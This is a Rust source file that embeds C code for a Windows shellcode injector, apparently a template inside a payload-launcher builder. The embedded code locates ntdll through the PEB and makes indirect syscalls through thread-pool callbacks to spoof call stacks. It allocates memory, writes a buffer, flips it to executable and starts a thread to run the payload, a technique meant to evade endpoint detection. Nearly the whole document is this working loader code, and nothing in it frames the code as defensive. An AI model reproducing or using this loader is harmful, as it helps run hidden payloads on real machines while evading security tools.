pub const SPOOFSTACKSLOCALINJ_C: &str = r#"

#include "../include/SpoofstacksLocalInj.h"
#include <stdio.h>
#include <windows.h>

HMODULE GetNtdllHandle()
{
#if defined(_WIN64)
        PPEB Peb = (PPEB)__readgsqword(0x60);
#else
        PPEB Peb = (PPEB)__readfsdword(0x30);
#endif

        PLDR_MODULE pLoadModule;
        pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);

        return (HMODULE)pLoadModule->BaseAddress;
}
LAUNCHER_STATUS CustomCallStacksCommonInj(IN PVOID pBuffer, IN DWORD sBufferSize, IN PNTAPI_FUNC g_Nt)
{
        if (pBuffer == NULL || sBufferSize == 0 || g_Nt == NULL)
        {
                printf("[!] Invalid Parameter\n");
                return LAUNCHER_STATUS_INVALID_PARAMETER;
        }
        SIZE_T ssBufferSize = sBufferSize;
        SIZE_T sssBufferSize = sBufferSize;
        NTSTATUS STATUS = 0;
        DWORD dwOld = 0;
        SIZE_T sNumberOfBytesWritten = 0;
        HANDLE hThread = NULL, hProcess = (HANDLE)-1;
        PVOID pAddress = NULL;

        FARPROC pTpAllocWork = g_Nt->TpAllocWork.pSyscallAddress;
        FARPROC pTpPostWork = g_Nt->TpPostWork.pSyscallAddress;
        FARPROC pTpReleaseWork = g_Nt->TpReleaseWork.pSyscallAddress;

        PTP_WORK WorkReturn = NULL;

        NTALLOCATEVIRTUALMEMORY_ARGS NtAllocateVirtualMemoryArgs = {0};
        NTWRITEVIRTUALMEMORY_ARGS NtWriteVirtualMemoryArgs = {0};
        NTPROTECTVIRTUALMEMORY_ARGS NtProtectVirtualMemoryArgs = {0};
        NTCREATETHREADEX_ARGS NtCreateThreadExArgs = {0};

        HANDLE hNtdll = GetNtdllHandle();
        Search_For_Syscall_Ret(hNtdll);
        Search_For_Add_Rsp_Ret(hNtdll);

        NtAllocateVirtualMemoryArgs.hProcess = hProcess;
        NtAllocateVirtualMemoryArgs.address = &pAddress;
        NtAllocateVirtualMemoryArgs.zeroBits = 0;
        NtAllocateVirtualMemoryArgs.size = &sssBufferSize;
        NtAllocateVirtualMemoryArgs.allocationType = (MEM_COMMIT | MEM_RESERVE);
        NtAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;
        NtAllocateVirtualMemoryArgs.ssn = g_Nt->NtAllocateVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtAllocateVirtualMemory,
                                    &NtAllocateVirtualMemoryArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Allocated Address: %p\n", pAddress);

        NtWriteVirtualMemoryArgs.hProcess = hProcess;
        NtWriteVirtualMemoryArgs.address = pAddress;
        NtWriteVirtualMemoryArgs.buffer = pBuffer;
        NtWriteVirtualMemoryArgs.numberOfBytesToWrite = ssBufferSize;
        NtWriteVirtualMemoryArgs.numberOfBytesWritten = &sNumberOfBytesWritten;
        NtWriteVirtualMemoryArgs.ssn = g_Nt->NtWriteVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtWriteVirtualMemory, &NtWriteVirtualMemoryArgs,
                                    NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Bytes Written : %d\n", sNumberOfBytesWritten);

        NtProtectVirtualMemoryArgs.hProcess = hProcess;
        NtProtectVirtualMemoryArgs.address = &pAddress;
        NtProtectVirtualMemoryArgs.size = &ssBufferSize;
        NtProtectVirtualMemoryArgs.permissions = PAGE_EXECUTE_READ;
        NtProtectVirtualMemoryArgs.old_permissions = &dwOld;
        NtProtectVirtualMemoryArgs.ssn = g_Nt->NtProtectVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtProtectVirtualMemory,
                                    &NtProtectVirtualMemoryArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Old permissions : %d\n", dwOld);

        NtCreateThreadExArgs.threadHandle = &hThread;
        NtCreateThreadExArgs.desiredAccess = THREAD_ALL_ACCESS;
        NtCreateThreadExArgs.objectAttributes = NULL;
        NtCreateThreadExArgs.processHandle = hProcess;
        NtCreateThreadExArgs.lpStartAddress = pAddress;
        NtCreateThreadExArgs.lpParameter = NULL;
        NtCreateThreadExArgs.flags = FALSE;
        NtCreateThreadExArgs.stackZeroBits = 0;
        NtCreateThreadExArgs.sizeOfStackCommit = 0;
        NtCreateThreadExArgs.sizeOfStackReserve = 0;
        NtCreateThreadExArgs.ssn = g_Nt->NtCreateThreadEx.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtCreateThreadEx, &NtCreateThreadExArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Thread Created : %d\n", GetThreadId(hThread));
        // waiting for the payload
        SET_SYSCALL(g_Nt->NtWaitForSingleObject);
        if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00)
        {
                printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
                return LAUNCHER_STATUS_FAILED;
        }
        return LAUNCHER_STATUS_SUCCESS;
}
"#;
